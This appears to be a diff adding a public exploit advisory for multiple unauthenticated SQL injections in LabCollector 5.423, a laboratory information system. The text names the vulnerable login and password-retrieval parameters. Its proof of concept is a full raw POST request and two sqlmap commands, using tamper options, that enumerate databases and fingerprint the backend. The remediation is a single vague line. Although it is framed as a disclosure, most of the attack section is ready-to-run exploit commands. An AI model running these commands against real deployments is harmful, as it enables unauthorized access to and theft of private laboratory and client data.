@@ -1,0 +1,60 @@
+# Exploit Title: LabCollector (Laboratory Information System) 5.423 - Multiples SQL Injection
+# Date: 09/09/2019
+# Software Links/Project: https://www.labcollector.com/clientarea/downloads.php
+# Version: LabCollector (Laboratory Information System) 5.423
+# Exploit Author: Carlos Avila
+# Category: webapps
+# Tested on: Debian 9 / Win10
+# Contact: http://twitter.com/badboy_nt
+
+1. Description
+  
+LabCollector Lab Services Manager (LSM) is a network based application that helps laboratories, core facilities, biotechs providing services to clients or partners to keep track of samples arriving for processing, track status and generate reports. Billing management is also possible. LSM is a simple and complete lab services LIMS software. Totally configurable by the user, it can be adapted to any situation. 
+
+This allows unauthenticated remote attacker to execute arbitrary SQL commands and obtain private information. Admin or users valid credentials aren't required. In a deeper analysis other pages are also affected with the vulnerability over others inputs.
+
+It written in PHP it is vulnerable to SQL Injection on multiples occurrences. The parameters affected are detailed below:
+
+http://192.168.0.102/labcollector/html/login.php [parameters affected via POST method: login]
+http://192.168.0.102/labcollector/html/retrieve_password.php (parameters affected via POST method: user_name)
+
+
+
+2. Proof of Concept
+
+
+----------------------------------------------------------------------------------------------------------------------------------
+Post Request:
+
+POST /labcollector/html/login.php HTTP/1.1
+Host: 192.168.0.102
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 113
+DNT: 1
+Connection: close
+Referer: http://192.168.0.102/labcollector/html/login.php
+Cookie: PHPSESSID=cio2kpq89f4da0b1fhakfn68k7
+Upgrade-Insecure-Requests: 1
+
+login=test&pass=hola&action=login&Submit=Sign+In
+
+----------------------------------------------------------------------------------------------------------------------------------
+
+All tests have been performed in a controlled and local environment.
+
+sunday:sqlmap badboy_nt$ python sqlmap.py -r SQLI-LabCollectorLogin --random-agent --tamper randomcase -p login --dbms mysql --dbs
+
+
+
+
+sunday:sqlmap badboy_nt$ python sqlmap.py -r SQLI-LabCollectorLogin2 --random-agent --tamper randomcase -p user_name --dbms mysql -f
+
+
+
+3. Solution:
+
+Application inputs must be validated correctly throughout the development of the project.
